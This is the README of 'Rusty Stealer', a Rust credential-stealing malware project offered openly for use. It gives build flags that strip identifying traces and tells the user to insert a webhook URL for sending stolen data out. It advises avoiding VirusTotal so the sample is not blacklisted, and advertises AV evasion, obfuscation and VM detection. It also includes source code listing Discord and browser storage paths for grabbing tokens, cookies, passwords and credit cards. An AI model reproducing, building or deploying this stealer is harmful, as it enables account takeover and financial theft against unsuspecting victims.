# Rusty Stealer 🚀
- *a blazing fast Discord Token Grabber & Stealer, no popo made with python*

- if not working, discord: nnvm

## Build :
```bash
powershell
$env:RUSTFLAGS = "-Zlocation-detail=none -Ctarget-cpu=native -Cdebuginfo=0 -Zstrip=symbols -Zstrip=debuginfo --remap-path-prefix  C:\Users\$env:USERNAME\.cargo\registry\src\=caca"
cargo build --release
```
- **--remap-path-prefix** remove your PC username in the output binary

## Fastest Grabber & Stealer **ever** :
```bash
Rusty-Grabber> time ./target/release/grabber
0.00user 0.00system 0:00.72elapsed 0%CPU (0avgtext+0avgdata 5396maxresident)k
0inputs+0outputs (1419major+0minor)pagefaults 0swaps
```
```
- Multithreading (Rayon, Tokio) -> Threading each path's and requests
- Parallelism (Rayon, jwalk) -> All files read simultaneously, jwalk to go to each entries fastly
- Mutex, Arc -> thread safety
```

## Fill your Webhook in utils.rs :
```bash
./src/global/utils.rs:29 in the WEBHOOK_URL const.
```

### Avoid using virus total when scanning the malware.
### They will blacklist the program
### Use [kleenscan](https://kleenscan.com/) instead (Anonymous reporting)

## I will maintain the code updated and more optimised
```md
- Work with new discord token's encryption 2023
- Grab all token's possible
- Check each token's
- Big AV Evasion (Fully obfuscated, String & Integer Xored, Detect VM)
- Grab All Browser (cookies, password, bookmarks, history, credits cards)
- Ip, mac, pc Info
- compress heavy data
- Hide Terminal Window
- Hiding Suspiscious Imports using LibLoad repos
- No persistence cause it will detect even more the malware
```

## Use inflate_data Build for uncompressing Browser Data (deflate_data.txt)

## Browser's Stealer & Discord Client handle :
```rs
// DISCORD TOKEN
pub static ref PATHS: HashMap<&'static str, String> = {
    let map = HashMap::from([
        ("Discord", format!("{}\\discord\\Local Storage\\leveldb\\", ROAMING)),
        ("Discord Canary", format!("{}\\discordcanary\\Local Storage\\leveldb\\", ROAMING)),
        ("Lightcord", format!("{}\\Lightcord\\Local Storage\\leveldb\\", ROAMING)),
        ("Discord PTB", format!("{}\\discordptb\\Local Storage\\leveldb\\", ROAMING)),
        ("Opera", format!("{}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\", ROAMING)),
        ("Opera GX", format!("{}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\", ROAMING)),
        ("Amigo", format!("{}\\Amigo\\User Data\\Local Storage\\leveldb\\", APPDATA)),
        ("Torch", format!("{}\\Torch\\User Data\\Local Storage\\leveldb\\", APPDATA)),
        ("Kometa", format!("{}\\Kometa\\User Data\\Local Storage\\leveldb\\", APPDATA)),
        ("Orbitum", format!("{}\\Orbitum\\User Data\\Local Storage\\leveldb\\", APPDATA)),
        ("CentBrowser", format!("{}\\CentBrowser\\User Data\\Local Storage\\leveldb\\", APPDATA)),
        ("7Star", format!("{}\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\", APPDATA)),
        ("Sputnik", format!("{}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\", APPDATA)),
        ("Vivaldi", format!("{}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
        ("Chrome SxS", format!("{}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\", APPDATA)),
        ("Firefox", format!("{}\\Mozilla\\Firefox\\Profiles\\", ROAMING)),
        ("Chrome", format!("{}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
        ("Chrome1", format!("{}\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\", APPDATA)),
        ("Chrome2", format!("{}\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\", APPDATA)),
        ("Chrome3", format!("{}\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\", APPDATA)),
        ("Chrome4", format!("{}\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\", APPDATA)),
        ("Chrome5", format!("{}\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\", APPDATA)),
        ("Epic Privacy Browser", format!("{}\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\", APPDATA)),
        ("Microsoft Edge", format!("{}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
        ("Uran", format!("{}\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
        ("Yandex", format!("{}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
        ("Brave", format!("{}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
        ("Iridium", format!("{}\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
    ]);
    map
};

// BROWSER STEALER
pub static ref BROWSERS: HashMap<String, String> = {
    let roaming = ROAMING.as_str();
    let appdata = APPDATA.as_str();
    return HashMap::from([
        (String::from(obf!("kometa")), format!("{}{}", appdata, obf!("\\Kometa\\User Data"))),
        (String::from(obf!("orbitum")), format!("{}{}", appdata, obf!("\\Orbitum\\User Data"))),
        (String::from(obf!("cent-browser")), format!("{}{}", appdata, obf!("\\CentBrowser\\User Data"))),
        (String::from(obf!("7star")), format!("{}{}", appdata, obf!("\\7Star\\7Star\\User Data"))),
        (String::from(obf!("sputnik")), format!("{}{}", appdata, obf!("\\Sputnik\\Sputnik\\User Data"))),
        (String::from(obf!("vivaldi")), format!("{}{}", appdata, obf!("\\Vivaldi\\User Data"))),
        (String::from(obf!("google-chrome-sxs")), format!("{}{}", appdata, obf!("\\Google\\Chrome SxS\\User Data"))),
        (String::from(obf!("google-chrome")), format!("{}{}", appdata, obf!("\\Google\\Chrome\\User Data"))),
        (String::from(obf!("epic-privacy-browser")), format!("{}{}", appdata, obf!("\\Epic Privacy Browser\\User Data"))),
        (String::from(obf!("microsoft-edge")), format!("{}{}", appdata, obf!("\\Microsoft\\Edge\\User Data"))),
        (String::from(obf!("uran")), format!("{}{}", appdata, obf!("\\uCozMedia\\Uran\\User Data"))),
        (String::from(obf!("yandex")), format!("{}{}", appdata, obf!("\\Yandex\\YandexBrowser\\User Data"))),
        (String::from(obf!("brave")), format!("{}{}", appdata, obf!("\\BraveSoftware\\Brave-Browser\\User Data"))),
        (String::from(obf!("iridium")), format!("{}{}", appdata, obf!("\\Iridium\\User Data"))),
        (String::from(obf!("opera")), format!("{}{}", roaming, obf!("\\Opera Software\\Opera Stable"))),
        (String::from(obf!("opera-gx")), format!("{}{}", roaming, obf!("\\Opera Software\\Opera GX Stable"))),
    ]);
                
};
```
